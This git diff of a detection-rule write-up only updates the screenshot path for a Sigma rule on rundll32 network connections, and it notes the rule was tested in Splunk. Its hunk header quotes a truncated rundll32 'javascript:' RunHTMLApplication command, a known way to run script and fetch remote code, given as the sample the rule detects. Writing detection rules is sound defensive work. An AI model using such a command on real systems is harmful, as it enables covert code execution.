@@ -58,7 +58,7 @@ rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObj
 ## Result
 Splunk
 
-![](https://github.com/P4T12ICK/Sigma-Rule-Repository/blob/master/screenshots/sysmon_rundll32_net_connections.png)
+![](https://github.com/P4T12ICK/Sigma-Rule-Repository/blob/master/detection-rules/T1085/sysmon_rundll32_net_connections.png)
 
 ## Note
 - Detection rule successfully tested.
